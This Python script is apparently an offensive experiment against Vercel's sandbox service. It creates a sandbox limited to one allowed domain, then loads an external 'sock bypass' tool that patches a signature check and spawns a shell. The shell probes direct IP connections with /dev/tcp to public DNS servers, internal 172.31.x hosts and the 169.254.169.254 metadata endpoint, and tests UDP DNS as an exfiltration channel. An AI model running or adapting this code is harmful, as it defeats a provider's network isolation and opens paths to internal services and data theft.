# 实验J87: spawn 进程 IP 直连矩阵 — DNS 白名单绕过 + 内网可达性 + UDP 通道
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj87"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

TOOL_B64 = base64.b64encode(open("init_sock_bypass.py", "rb").read()).decode()

PROBE = r"""
import importlib.util, base64, subprocess, socket, struct, json, time

TARGETS = [
    ("8.8.8.8", 80), ("8.8.8.8", 443), ("1.1.1.1", 80),
    ("172.31.0.2", 80), ("172.31.0.2", 443), ("172.31.0.2", 22),
    ("172.31.0.1", 80), ("169.254.169.254", 80), ("169.254.169.254", 443),
]

def tcp_probe(ip, port, timeout=4):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return "OPEN"
    except socket.timeout:
        return "TIMEOUT(drop)"
    except ConnectionRefusedError:
        return "REFUSED"
    except OSError as e:
        return f"ERR({e.errno})"

print("== [1] 基线: shell 直连 IP ==", flush=True)
for ip, port in TARGETS:
    print(f"  shell {ip}:{port} -> {tcp_probe(ip, port)}", flush=True)

print("== [2] spawn 进程直连 IP ==", flush=True)
TOOL = base64.b64decode(r""" + '"' + TOOL_B64 + '"' + r""")
open("/tmp/ib.py", "wb").write(TOOL)
spec = importlib.util.spec_from_file_location("ib", "/tmp/ib.py")
ib = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ib)
ib.patch_sigcheck()

probe_sh = r'''
echo '--- tcp probe ---'
for t in "8.8.8.8:80" "8.8.8.8:443" "1.1.1.1:80" "172.31.0.2:80" "172.31.0.2:443" "172.31.0.2:22" "172.31.0.1:80" "169.254.169.254:80" "169.254.169.254:443"; do
  ip=${t%%:*}; port=${t##*:}
  timeout 4 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null && echo "$t OPEN" || echo "$t CLOSED/DROP"
done
echo '--- httpbin ip 直连 ---'
getent hosts httpbin.org | head -2
echo '--- udp dns 外带测试 (8.8.8.8:53) ---'
python3 - <<'PYEOF'
import socket, time
# DNS query for A record of test.com to 8.8.8.8 and 172.31.0.2
q = bytes.fromhex("aabb01000001000000000000037677770874657374" + "03" + "636f6d0000010001")
for dst in [("8.8.8.8", 53), ("172.31.0.2", 53), ("1.1.1.1", 53)]:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    try:
        s.sendto(q, dst)
        d, _ = s.recvfrom(512)
        print(f"UDP {dst[0]}:53 -> RESPONSE {len(d)}B", flush=True)
    except socket.timeout:
        print(f"UDP {dst[0]}:53 -> TIMEOUT", flush=True)
    except OSError as e:
        print(f"UDP {dst[0]}:53 -> ERR {e}", flush=True)
    finally:
        s.close()
PYEOF
'''
ib.spawn("sh", args=["-c", probe_sh], timeout=90)
"""
run_cmd(sid, PROBE, "ip-matrix", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
